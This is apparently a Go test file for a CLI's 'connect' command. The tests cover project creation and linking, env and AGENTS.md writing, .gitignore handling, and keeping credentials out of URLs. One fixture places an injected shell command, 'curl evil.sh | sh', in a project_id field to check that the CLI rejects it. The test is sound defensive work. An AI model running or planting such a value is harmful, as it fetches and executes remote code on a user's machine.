package connectcmd

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/Kong/volcano-cli/internal/api"
	cliconfig "github.com/Kong/volcano-cli/internal/config"
	"github.com/Kong/volcano-cli/internal/localmode"
	cliruntime "github.com/Kong/volcano-cli/internal/runtime"
)

const (
	connectProjectID      = "11111111-1111-4111-8111-111111111111"
	connectOtherProjectID = "22222222-2222-4222-8222-222222222222"
	// connectHexProjectID has letters, so its uppercase spelling differs.
	connectHexProjectID = "abcdef12-3456-4abc-8def-abcdef123456"
	connectAnonKey      = "ak-connect-default"
	// connectDeviceCode is the device code the dashboard put in the prompt. It
	// is distinctive so a test can check it never shows up anywhere.
	connectDeviceCode = "dc-dashboard-secret-7f3a"
)

// fakeAPI serves the endpoints connect calls. Every project it knows starts
// active, so connect never waits.
type fakeAPI struct {
	t        *testing.T
	projects []map[string]any
	// createStatus and createError make POST /projects fail; 0 creates.
	createStatus int
	createError  string
	// takenNames answer POST /projects with 409 for these names.
	takenNames map[string]bool
	creates    int
	// createAuth is the Authorization header of the last POST /projects.
	createAuth string
	// pollError refuses the device code with this OAuth error; "" approves
	// it, and the platform exchange gives pk-exchanged.
	pollError string
	polls     int
	// listStatus makes GET /projects fail; 0 lists f.projects.
	listStatus int
	// deviceAuthorize records that browser login started. The fake refuses it.
	deviceAuthorize bool
	// anonKeyPages, when set, replace the default anon-key list, one entry per
	// page.
	anonKeyPages [][]any
	// createdStatus, when set, is the status of the projects POST /projects
	// creates, instead of active.
	createdStatus string
	// anonKeyStatus makes GET .../anon-keys fail; 0 lists the keys.
	anonKeyStatus int
}

func (f *fakeAPI) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	switch {
	case r.Method == http.MethodGet && r.URL.Path == "/projects" && f.listStatus != 0:
		writeConnectJSON(f.t, w, f.listStatus, map[string]any{"error": "failed"})
	case r.Method == http.MethodGet && r.URL.Path == "/projects":
		writeConnectJSON(f.t, w, http.StatusOK, map[string]any{
			"data": f.projects, "has_more": false, "page": 1, "limit": 100, "total": len(f.projects),
		})
	case r.Method == http.MethodPost && r.URL.Path == "/auth/device/authorize":
		f.deviceAuthorize = true
		writeConnectJSON(f.t, w, http.StatusServiceUnavailable, map[string]any{"error": "unavailable"})
	case r.Method == http.MethodPost && r.URL.Path == "/auth/device/token":
		f.polls++
		var body map[string]string
		require.NoError(f.t, json.NewDecoder(r.Body).Decode(&body))
		assert.Equal(f.t, localmode.DeviceClientID, body["client_id"])
		assert.Equal(f.t, connectDeviceCode, body["device_code"])
		if f.pollError != "" {
			writeConnectJSON(f.t, w, http.StatusBadRequest, map[string]any{"error": f.pollError, "error_description": "refused"})
			return
		}
		writeConnectJSON(f.t, w, http.StatusOK, map[string]any{"access_token": "auth-access-token", "token_type": "bearer", "expires_in": 3600})
	case r.Method == http.MethodPost && r.URL.Path == "/auth/platform/exchange":
		assert.Equal(f.t, "Bearer auth-access-token", r.Header.Get("Authorization"))
		writeConnectJSON(f.t, w, http.StatusOK, map[string]any{
			"token": "pk-exchanged", "user_id": "user-1", "token_id": "33333333-3333-4333-8333-333333333333",
			"expires_at": time.Now().Add(24 * time.Hour).UTC().Format(time.RFC3339),
		})
	case r.Method == http.MethodPost && r.URL.Path == "/projects":
		f.creates++
		f.createAuth = r.Header.Get("Authorization")
		if f.createStatus != 0 {
			writeConnectJSON(f.t, w, f.createStatus, map[string]any{"error": f.createError})
			return
		}
		var body struct {
			Name string `json:"name"`
		}
		require.NoError(f.t, json.NewDecoder(r.Body).Decode(&body))
		if f.takenNames[body.Name] {
			writeConnectJSON(f.t, w, http.StatusConflict, map[string]any{"error": "project name already exists"})
			return
		}
		project := connectProjectPayload(connectProjectID, body.Name)
		if f.createdStatus != "" {
			project["status"] = f.createdStatus
		}
		f.projects = append(f.projects, project)
		writeConnectJSON(f.t, w, http.StatusCreated, project)
	case r.Method == http.MethodGet && strings.HasSuffix(r.URL.Path, "/anon-keys") && f.anonKeyStatus != 0:
		writeConnectJSON(f.t, w, f.anonKeyStatus, map[string]any{"error": "failed"})
	case r.Method == http.MethodGet && strings.HasSuffix(r.URL.Path, "/anon-keys") && f.anonKeyPages != nil:
		page := 1
		if raw := r.URL.Query().Get("page"); raw != "" {
			var err error
			page, err = strconv.Atoi(raw)
			require.NoError(f.t, err)
		}
		writeConnectJSON(f.t, w, http.StatusOK, map[string]any{
			"data": f.anonKeyPages[page-1], "has_more": page < len(f.anonKeyPages),
		})
	case r.Method == http.MethodGet && strings.HasSuffix(r.URL.Path, "/anon-keys"):
		writeConnectJSON(f.t, w, http.StatusOK, map[string]any{
			"data": []any{
				map[string]any{"id": "33333333-3333-4333-8333-333333333333", "name": "old", "key_value": "ak-old", "is_default": false},
				map[string]any{"id": "44444444-4444-4444-8444-444444444444", "name": "default", "key_value": connectAnonKey, "is_default": true},
			},
		})
	case r.Method == http.MethodGet && strings.HasPrefix(r.URL.Path, "/projects/"):
		id := strings.TrimPrefix(r.URL.Path, "/projects/")
		for _, p := range f.projects {
			if p["id"] == id {
				writeConnectJSON(f.t, w, http.StatusOK, p)
				return
			}
		}
		writeConnectJSON(f.t, w, http.StatusNotFound, map[string]any{"error": "project not found"})
	default:
		f.t.Errorf("unexpected request %s %s", r.Method, r.URL.Path)
		http.NotFound(w, r)
	}
}

func TestConnectCreatesAProjectNamedAfterTheDirectoryAndLinksIt(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := filepath.Join(t.TempDir(), "My App")

	out, err := runConnect(t, server, dir, "--json")
	require.NoError(t, err)

	var res result
	require.NoError(t, json.Unmarshal([]byte(out), &res), out)
	assert.Equal(t, projectRef{ID: connectProjectID, Name: "my-app"}, res.Project)
	assert.True(t, res.Created)
	assert.Equal(t, 1, fake.creates)
	assert.Equal(t, "http://localhost:3000/dashboard/overview?project="+connectProjectID, res.DashboardURL)

	link, err := cliconfig.FindLink(dir)
	require.NoError(t, err)
	require.NotNil(t, link)
	assert.Equal(t, cliconfig.ProjectConfig{ID: connectProjectID, Name: "my-app"}, link.Project)

	env := readFile(t, filepath.Join(dir, "volcano", "cloud.env"))
	for _, line := range []string{
		"VOLCANO_API_URL=" + server.URL,
		"VOLCANO_ANON_KEY=" + connectAnonKey,
		"NEXT_PUBLIC_VOLCANO_API_URL=" + server.URL,
		"NEXT_PUBLIC_VOLCANO_ANON_KEY=" + connectAnonKey,
	} {
		assert.Contains(t, env, line+"\n")
	}
	info, err := os.Stat(filepath.Join(dir, "volcano", "cloud.env"))
	require.NoError(t, err)
	assert.Equal(t, os.FileMode(0o600), info.Mode().Perm())

	assert.FileExists(t, filepath.Join(dir, "volcano", "volcano.env"), "the base scaffold is created")
	agents := readFile(t, filepath.Join(dir, "AGENTS.md"))
	assert.Contains(t, agents, "linked to a Volcano cloud project in .volcano/project.json")
	assert.Contains(t, agents, "If the file is\nmissing, run `volcano connect .` here.", "a bare connect would set up a new directory instead")
	assert.NotContains(t, agents, connectProjectID, "AGENTS.md is shared; the project is each developer's own")

	assertGitIgnored(t, dir, "volcano/cloud.env", ".volcano/project.json")
}

func TestConnectLeavesCredentialsOutOfTheDashboardURL(t *testing.T) {
	setConnectTestHome(t)
	t.Setenv("VOLCANO_WEB_URL", "https://user:secret@staging.example/?token=abc#frag")
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := filepath.Join(t.TempDir(), "my-app")

	out, err := runConnect(t, server, dir, "--json")
	require.NoError(t, err)

	var res result
	require.NoError(t, json.Unmarshal([]byte(out), &res), out)
	assert.Equal(t, "https://staging.example/dashboard/overview?project="+connectProjectID, res.DashboardURL)
	agents := readFile(t, filepath.Join(dir, "AGENTS.md"))
	assert.Contains(t, agents, "- Dashboard: https://staging.example/dashboard\n")
	for _, secret := range []string{"secret", "token=abc", "frag"} {
		assert.NotContains(t, agents, secret)
		assert.NotContains(t, out, secret)
	}
}

func TestConnectRerunReusesTheLinkAndUpdatesFilesInPlace(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t, projects: []map[string]any{connectProjectPayload(connectProjectID, "shop")}}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := t.TempDir()
	_, err := cliconfig.WriteLink(dir, cliconfig.ProjectConfig{ID: connectProjectID, Name: "shop"})
	require.NoError(t, err)
	require.NoError(t, os.WriteFile(filepath.Join(dir, "AGENTS.md"), []byte("# My rules\n\nUse tabs.\n"), 0o644))
	require.NoError(t, os.MkdirAll(filepath.Join(dir, "volcano"), 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(dir, "volcano", "cloud.env"), []byte("STRIPE_KEY=sk_test\nVOLCANO_ANON_KEY=ak-stale\n"), 0o600))
	require.NoError(t, os.WriteFile(filepath.Join(dir, ".gitignore"), []byte("node_modules"), 0o644))

	for range 2 {
		_, err := runConnect(t, server, dir)
		require.NoError(t, err)
	}

	assert.Zero(t, fake.creates, "a linked directory keeps its project")
	env := readFile(t, filepath.Join(dir, "volcano", "cloud.env"))
	assert.Contains(t, env, "STRIPE_KEY=sk_test\n")
	assert.Equal(t, 1, strings.Count(env, "\nVOLCANO_ANON_KEY="), env)
	assert.Contains(t, env, "VOLCANO_ANON_KEY="+connectAnonKey+"\n")
	assert.NotContains(t, env, "ak-stale")

	agents := readFile(t, filepath.Join(dir, "AGENTS.md"))
	assert.True(t, strings.HasPrefix(agents, "# My rules\n\nUse tabs.\n\n"), agents)
	assert.Equal(t, 1, strings.Count(agents, agentsStartMarker), agents)

	// The link was there before connect ran: a team that commits it removes
	// its .gitignore entry, so connect doesn't add it back.
	gitignore := readFile(t, filepath.Join(dir, ".gitignore"))
	assert.True(t, strings.HasPrefix(gitignore, "node_modules\n"), gitignore)
	assert.NotContains(t, gitignore, ".volcano/project.json")
	assert.Equal(t, 1, strings.Count(gitignore, "volcano/*.env"), gitignore)
	assert.NoDirExists(t, filepath.Join(dir, "volcano", "migrations"), "an existing volcano/ directory is left alone")
	// No scaffold ran, so only the root .gitignore entry connect adds keeps this out.
	assertGitIgnored(t, dir, "volcano/cloud.env")
}

// A negation is how a team says it commits the link, so connect leaves it.
func TestConnectKeepsANegatedLinkEntryInGitignore(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := filepath.Join(t.TempDir(), "shop")
	require.NoError(t, os.MkdirAll(dir, 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(dir, ".gitignore"), []byte("!.volcano/project.json\n"), 0o644))

	_, err := runConnect(t, server, dir)
	require.NoError(t, err)

	gitignore := readFile(t, filepath.Join(dir, ".gitignore"))
	assert.Equal(t, 1, strings.Count(gitignore, ".volcano/project.json"), gitignore)
	assert.Contains(t, gitignore, "volcano/*.env\n")
}

// Without --project, connect creates a project. At the plan's limit it fails and names
// the projects that --project could link instead.
func TestConnectAtTheProjectLimitNamesTheProjectsToLink(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{
		t:            t,
		projects:     []map[string]any{connectProjectPayload(connectOtherProjectID, "first-project")},
		createStatus: http.StatusForbidden,
		createError:  "project limit exceeded (max 1 projects per user)",
	}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := t.TempDir()

	_, err := runConnect(t, server, dir, "--json")
	require.Error(t, err)
	assert.Equal(t, http.StatusForbidden, api.Status(err))
	require.ErrorContains(t, err, "project limit exceeded")
	require.ErrorContains(t, err, "first-project: volcano connect --project "+connectOtherProjectID)
	link, err := cliconfig.FindLink(dir)
	require.NoError(t, err)
	assert.Nil(t, link, "nothing is linked when no project was created")
}

func TestConnectAddsASuffixWhenTheNameIsTaken(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t, takenNames: map[string]bool{"shop": true, "shop-2": true}}
	server := httptest.NewServer(fake)
	defer server.Close()

	out, err := runConnect(t, server, filepath.Join(t.TempDir(), "shop"), "--json")
	require.NoError(t, err)

	var res result
	require.NoError(t, json.Unmarshal([]byte(out), &res), out)
	assert.Equal(t, "shop-3", res.Project.Name)
	assert.True(t, res.Created)
	assert.Equal(t, 3, fake.creates)
}

func TestConnectRejectsAnUnknownTemplateBeforeCreatingAProject(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()

	_, err := runConnect(t, server, t.TempDir(), "--template", "nextjss")
	require.ErrorContains(t, err, `unknown starter "nextjss"`)
	assert.Zero(t, fake.creates)
}

// connect's first run wrote a root .gitignore that differs from the starter's.
// A later --template still adds the starter.
func TestConnectAddsATemplateToAConnectedDirectory(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := filepath.Join(t.TempDir(), "shop")

	_, err := runConnect(t, server, dir)
	require.NoError(t, err)
	for range 2 {
		out, err := runConnect(t, server, dir, "--template", "nextjs")
		require.NoError(t, err)
		assert.NotContains(t, out, "Skipped the scaffold")
	}

	assert.Equal(t, 1, fake.creates)
	assert.FileExists(t, filepath.Join(dir, "package.json"))
	assert.FileExists(t, filepath.Join(dir, ".volcano", "source-layout.json"))
	gitignore := readFile(t, filepath.Join(dir, ".gitignore"))
	for _, entry := range []string{"node_modules", ".volcano/project.json", "volcano/*.env"} {
		assert.Equal(t, 1, strings.Count(gitignore, entry+"\n"), gitignore)
	}
}

// npm install rewrites package.json. Rerunning the pasted command with
// --template must still work, and keep the user's version.
func TestConnectRerunWithATemplateKeepsChangedStarterFiles(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := filepath.Join(t.TempDir(), "shop")
	_, err := runConnect(t, server, dir, "--template", "nextjs")
	require.NoError(t, err)
	packageJSON := filepath.Join(dir, "package.json")
	require.NoError(t, os.WriteFile(packageJSON, []byte(`{"name":"x"}`), 0o644))

	out, err := runConnect(t, server, dir, "--template", "nextjs")
	require.NoError(t, err)
	assert.Contains(t, out, "Kept the changed nextjs starter files: package.json")
	assert.JSONEq(t, `{"name":"x"}`, readFile(t, packageJSON))
}

// A --template that can't be added fails before sign-in, instead of
// connecting without the starter.
func TestConnectRefusesATemplateThatConflictsBeforeSigningIn(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(dir, "package.json"), []byte("{}\n"), 0o644))

	_, err := runConnect(t, server, dir, "--template", "nextjs", "--device-code", connectDeviceCode)
	require.ErrorContains(t, err, "can't add the nextjs starter")
	require.ErrorContains(t, err, "package.json (has different content)")
	assert.Zero(t, fake.polls, "the device code is not spent")
	assert.Zero(t, fake.creates)
	assert.NoDirExists(t, filepath.Join(dir, ".volcano"))
}

// --name replaces a link connect can't use with a new project, so the check
// must come before the project is created.
func TestConnectWithNameRefusesATemplateThatConflictsBeforeCreatingAProject(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := chdirTemp(t)
	writeBadLink(t, dir)
	require.NoError(t, os.WriteFile(filepath.Join(dir, "package.json"), []byte("{}\n"), 0o644))

	_, err := runConnectHere(t, server, "--name", "shop", "--template", "nextjs")
	require.ErrorContains(t, err, "can't add the nextjs starter")
	assert.Zero(t, fake.creates)
}

// With --project and no directory argument, the directory is known only once
// the project is: the check runs then, before any file changes.
func TestConnectWithProjectRefusesATemplateThatConflicts(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t, projects: []map[string]any{connectProjectPayload(connectOtherProjectID, "blog")}}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := filepath.Join(chdirTemp(t), "blog")
	_, err := cliconfig.WriteLink(dir, cliconfig.ProjectConfig{ID: connectOtherProjectID, Name: "blog"})
	require.NoError(t, err)
	require.NoError(t, os.WriteFile(filepath.Join(dir, "package.json"), []byte("{}\n"), 0o644))

	_, err = runConnectHere(t, server, "--project", connectOtherProjectID, "--template", "nextjs")
	require.ErrorContains(t, err, "can't add the nextjs starter")
	assert.NoDirExists(t, filepath.Join(dir, "volcano"))
}

// An unrelated directory with the project's name, such as another
// repository, gets nothing unless it is named on purpose.
func TestConnectWithProjectRefusesAnExistingUnlinkedDirectory(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t, projects: []map[string]any{connectProjectPayload(connectOtherProjectID, "blog")}}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := filepath.Join(chdirTemp(t), "blog")
	require.NoError(t, os.MkdirAll(dir, 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(dir, "README.md"), []byte("other repo\n"), 0o644))

	_, err := runConnectHere(t, server, "--project", connectOtherProjectID)
	require.ErrorContains(t, err, "./blog already exists and is not linked to blog. To set the project up in it, run: volcano connect ./blog --project "+connectOtherProjectID)
	assert.NoDirExists(t, filepath.Join(dir, ".volcano"))
	assert.NoFileExists(t, filepath.Join(dir, "AGENTS.md"))

	// An empty directory, such as one a stopped run left, is used.
	require.NoError(t, os.Remove(filepath.Join(dir, "README.md")))
	_, err = runConnectHere(t, server, "--project", connectOtherProjectID)
	require.NoError(t, err)
	assert.FileExists(t, filepath.Join(dir, ".volcano", "project.json"))
}

func TestConnectFindsTheDefaultAnonKeyOnALaterPage(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{
		t:        t,
		projects: []map[string]any{connectProjectPayload(connectOtherProjectID, "blog")},
		anonKeyPages: [][]any{
			{map[string]any{"id": "33333333-3333-4333-8333-333333333333", "name": "newest", "key_value": "ak-newest", "is_default": false}},
			{map[string]any{"id": "44444444-4444-4444-8444-444444444444", "name": "default", "key_value": connectAnonKey, "is_default": true}},
		},
	}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := t.TempDir()

	_, err := runConnect(t, server, dir, "--project", connectOtherProjectID)
	require.NoError(t, err)
	env := readFile(t, filepath.Join(dir, "volcano", "cloud.env"))
	assert.Contains(t, env, "VOLCANO_ANON_KEY="+connectAnonKey+"\n")
	assert.NotContains(t, env, "ak-newest")
}

func TestConnectProjectFlagTakesAnID(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t, projects: []map[string]any{connectProjectPayload(connectOtherProjectID, "blog")}}
	server := httptest.NewServer(fake)
	defer server.Close()

	_, err := runConnect(t, server, t.TempDir(), "--project", "blog")
	require.ErrorContains(t, err, "--project takes a project ID")
	assert.Zero(t, fake.creates)
}

func TestConnectWithProjectLinksIt(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t, projects: []map[string]any{connectProjectPayload(connectOtherProjectID, "blog")}}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := t.TempDir()

	out, err := runConnect(t, server, dir, "--project", connectOtherProjectID)
	require.NoError(t, err)
	assert.Contains(t, out, "Project:   blog\n")
	assert.Contains(t, out, "Dashboard: http://localhost:3000/dashboard/overview?project="+connectOtherProjectID+"\n")

	assert.Zero(t, fake.creates)
	link, err := cliconfig.FindLink(dir)
	require.NoError(t, err)
	require.NotNil(t, link)
	assert.Equal(t, connectOtherProjectID, link.Project.ID)
}

// The user named both the directory and the project, so connect relinks it,
// and says which project it replaced and how to go back, as login does.
func TestConnectWithProjectWarnsWhenItRelinksADirectory(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t, projects: []map[string]any{
		connectProjectPayload(connectProjectID, "shop"), connectProjectPayload(connectOtherProjectID, "blog"),
	}}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := chdirTemp(t)
	_, err := cliconfig.WriteLink(dir, cliconfig.ProjectConfig{ID: connectProjectID, Name: "shop"})
	require.NoError(t, err)

	out, err := runConnect(t, server, ".", "--project", connectOtherProjectID)
	require.NoError(t, err)
	assert.Contains(t, out, ". was linked to shop ("+connectProjectID+"). It is now linked to blog ("+connectOtherProjectID+"). "+
		"To undo, run: volcano connect . --project "+connectProjectID)
	link, err := cliconfig.FindLink(dir)
	require.NoError(t, err)
	require.NotNil(t, link)
	assert.Equal(t, connectOtherProjectID, link.Project.ID)
}

// The printed commands must paste as one argument for a directory with a space.
func TestConnectQuotesADirectoryWithASpaceInPrintedCommands(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t, projects: []map[string]any{
		connectProjectPayload(connectProjectID, "shop"), connectProjectPayload(connectOtherProjectID, "blog"),
	}}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := filepath.Join(chdirTemp(t), "My App")
	_, err := cliconfig.WriteLink(dir, cliconfig.ProjectConfig{ID: connectProjectID, Name: "shop"})
	require.NoError(t, err)

	out, err := runConnect(t, server, "My App", "--project", connectOtherProjectID)
	require.NoError(t, err)
	shown := "." + string(filepath.Separator) + "My App"
	assert.Contains(t, out, "To undo, run: volcano connect '"+shown+"' --project "+connectProjectID)
	assert.Contains(t, out, "Next: cd '"+shown+"', read AGENTS.md there")
}

func TestConnectQuotesADirectoryWithASpaceInTheBadLinkError(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := filepath.Join(chdirTemp(t), "My App")
	writeBadLink(t, dir)

	_, err := runConnect(t, server, "My App")
	require.ErrorContains(t, err, "run: volcano connect '."+string(filepath.Separator)+"My App' --project <project-id>")
}

func TestWriteAgentsSectionRefusesAStartMarkerWithoutAnEndMarker(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, agentsFileName)
	content := "# Mine\n\n" + agentsStartMarker + "\n## Volcano\n\nmy notes\n"
	require.NoError(t, os.WriteFile(path, []byte(content), 0o600))

	err := writeAgentsSection(dir, agentsSection("https://volcano.dev/dashboard"))
	require.ErrorContains(t, err, path+" has the Volcano section's start marker")
	assert.Equal(t, content, readFile(t, path))
}

// An end marker before the start marker isn't the section's end, so the text
// between them is kept.
func TestWriteAgentsSectionPairsTheStartWithTheEndAfterIt(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, agentsFileName)
	require.NoError(t, os.WriteFile(path, []byte(agentsEndMarker+"\nkeep me\n"+agentsStartMarker+"\nold\n"+agentsEndMarker+"\ntail\n"), 0o600))

	section := agentsSection("https://volcano.dev/dashboard")
	require.NoError(t, writeAgentsSection(dir, section))
	assert.Equal(t, agentsEndMarker+"\nkeep me\n"+section+"tail\n", readFile(t, path))
}

func TestConnectWithNoDirectoryCreatesOneNamedAfterTheProject(t *testing.T) {
	setConnectTestHome(t)
	useGeneratedName(t, "fuji-amber-42")
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()
	parent := chdirTemp(t)

	out, err := runConnectHere(t, server)
	require.NoError(t, err)
	assert.Contains(t, out, "Project:   fuji-amber-42\nDirectory: ./fuji-amber-42\nDashboard: http://localhost:3000/dashboard/overview?project="+connectProjectID+"\n")
	assert.Contains(t, out, "Next: cd ./fuji-amber-42, read AGENTS.md there")

	dir := filepath.Join(parent, "fuji-amber-42")
	link, err := cliconfig.FindLink(dir)
	require.NoError(t, err)
	require.NotNil(t, link)
	assert.Equal(t, cliconfig.ProjectConfig{ID: connectProjectID, Name: "fuji-amber-42"}, link.Project)
	assert.FileExists(t, filepath.Join(dir, "AGENTS.md"))
	assert.NoFileExists(t, filepath.Join(parent, "AGENTS.md"), "the working directory is left alone")
}

func TestConnectWithNoDirectorySkipsNamesWhoseDirectoryExists(t *testing.T) {
	setConnectTestHome(t)
	useGeneratedName(t, "fuji-amber-42")
	fake := &fakeAPI{t: t, takenNames: map[string]bool{"fuji-amber-42-2": true}}
	server := httptest.NewServer(fake)
	defer server.Close()
	parent := chdirTemp(t)
	require.NoError(t, os.Mkdir(filepath.Join(parent, "fuji-amber-42"), 0o755))

	out, err := runConnectHere(t, server, "--json")
	require.NoError(t, err)

	var res result
	require.NoError(t, json.Unmarshal([]byte(out), &res), out)
	assert.Equal(t, "fuji-amber-42-3", res.Project.Name)
	assert.Equal(t, filepath.Join(parent, "fuji-amber-42-3"), res.Directory)
	assert.Equal(t, 2, fake.creates, "the existing directory's name is never sent")
}

func TestConnectWithNoDirectoryStopsWhenEveryNameHasADirectory(t *testing.T) {
	setConnectTestHome(t)
	useGeneratedName(t, "shop")
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()
	parent := chdirTemp(t)
	require.NoError(t, os.Mkdir(filepath.Join(parent, "shop"), 0o755))
	for suffix := 2; suffix <= maxNameSuffix; suffix++ {
		require.NoError(t, os.Mkdir(filepath.Join(parent, fmt.Sprintf("shop-%d", suffix)), 0o755))
	}

	_, err := runConnectHere(t, server)
	require.ErrorContains(t, err, "shop through shop-20 are taken")
	assert.Zero(t, fake.creates, "an existing directory is never reused")
}

func TestConnectInsideALinkedDirectoryKeepsItsProject(t *testing.T) {
	setConnectTestHome(t)
	useGeneratedName(t, "fuji-amber-42")
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()
	parent := chdirTemp(t)

	_, err := runConnectHere(t, server)
	require.NoError(t, err)
	dir := filepath.Join(parent, "fuji-amber-42")
	require.NoError(t, os.MkdirAll(filepath.Join(dir, "web"), 0o755))
	t.Chdir(filepath.Join(dir, "web"))

	out, err := runConnectHere(t, server)
	require.NoError(t, err)
	assert.Equal(t, 1, fake.creates)
	assert.Contains(t, out, "Directory: "+dir+"\n")
	assert.NoDirExists(t, filepath.Join(dir, "web", "fuji-amber-42"))
}

// A linked directory keeps its project, so --name would be dropped without a
// word. connect refuses before it signs in.
func TestConnectRefusesNameInsideALinkedDirectory(t *testing.T) {
	for name, args := range map[string][]string{
		"no directory":       {},
		"directory argument": {"."},
	} {
		t.Run(name, func(t *testing.T) {
			setConnectTestHome(t)
			fake := &fakeAPI{t: t, projects: []map[string]any{connectProjectPayload(connectProjectID, "blog")}}
			server := httptest.NewServer(fake)
			defer server.Close()
			dir := chdirTemp(t)
			_, err := cliconfig.WriteLink(dir, cliconfig.ProjectConfig{ID: connectProjectID, Name: "blog"})
			require.NoError(t, err)

			_, err = runConnectHere(t, server, append(args, "--name", "shop", "--device-code", connectDeviceCode)...)
			require.ErrorContains(t, err, ". is linked to blog ("+connectProjectID+"), and connect keeps a linked directory's project, "+
				"so --name would be ignored")
			assert.Zero(t, fake.polls)
			assert.Zero(t, fake.creates)
		})
	}
}

const badLink = "<<<<<<< HEAD\n"

// writeBadLink gives dir a project link that can't be parsed and returns its
// path.
func writeBadLink(t *testing.T, dir string) string {
	t.Helper()
	path := filepath.Join(dir, ".volcano", "project.json")
	require.NoError(t, os.MkdirAll(filepath.Dir(path), 0o755))
	require.NoError(t, os.WriteFile(path, []byte(badLink), 0o644))
	return path
}

// Replacing a bad link with a new project could leave the user with two, so
// connect asks which project goes there.
func TestConnectRefusesToGuessPastABadLink(t *testing.T) {
	for name, run := range map[string]func(*httptest.Server) (string, error){
		"directory argument": func(server *httptest.Server) (string, error) { return runConnect(t, server, ".") },
		"no directory":       func(server *httptest.Server) (string, error) { return runConnectHere(t, server) },
	} {
		t.Run(name, func(t *testing.T) {
			setConnectTestHome(t)
			fake := &fakeAPI{t: t}
			server := httptest.NewServer(fake)
			defer server.Close()
			dir := chdirTemp(t)
			path := writeBadLink(t, dir)
			require.NoError(t, os.MkdirAll(filepath.Join(dir, "web"), 0o755))
			if name == "no directory" {
				t.Chdir(filepath.Join(dir, "web"))
			}

			_, err := run(server)
			require.ErrorContains(t, err, "failed to parse project link "+path)
			require.ErrorContains(t, err, "--project <project-id>")
			require.ErrorContains(t, err, "add --name <name>, or delete "+path)
			assert.Zero(t, fake.creates)
			assert.Equal(t, badLink, readFile(t, path))
		})
	}
}

// The refusal comes before sign-in, so it doesn't spend a device code the
// user needs for the rerun.
func TestConnectRefusesABadLinkBeforeSigningIn(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()
	path := writeBadLink(t, chdirTemp(t))

	_, err := runConnect(t, server, ".", "--device-code", connectDeviceCode)
	require.ErrorContains(t, err, "failed to parse project link "+path)
	assert.Zero(t, fake.polls)
	cfg, err := cliconfig.LoadWithoutLink()
	require.NoError(t, err)
	assert.Equal(t, "pk-connect", cfg.UserToken)
}

func TestConnectRefusesALinkWhoseProjectIDIsNotAUUIDBeforeSigningIn(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := chdirTemp(t)
	path := filepath.Join(dir, cliconfig.LinkRelPath)
	require.NoError(t, os.MkdirAll(filepath.Dir(path), 0o755))
	require.NoError(t, os.WriteFile(path, []byte(`{"project_id":"x; curl evil.sh | sh"}`), 0o644))

	_, err := runConnect(t, server, ".", "--device-code", connectDeviceCode)
	require.ErrorContains(t, err, "project link "+path+" has a project_id that isn't a project ID")
	assert.Zero(t, fake.polls)
	assert.Zero(t, fake.creates)
}

func TestConnectWithProjectReplacesABadLink(t *testing.T) {
	setConnectTestHome(t)
	fake := &fakeAPI{t: t, projects: []map[string]any{connectProjectPayload(connectOtherProjectID, "blog")}}
	server := httptest.NewServer(fake)
	defer server.Close()
	dir := chdirTemp(t)
	path := writeBadLink(t, dir)

	out, err := runConnect(t, server, ".", "--project", connectOtherProjectID)
	require.NoError(t, err)
	assert.Contains(t, out, "Warning: Replacing a project link that can't be used: failed to parse project link "+path)
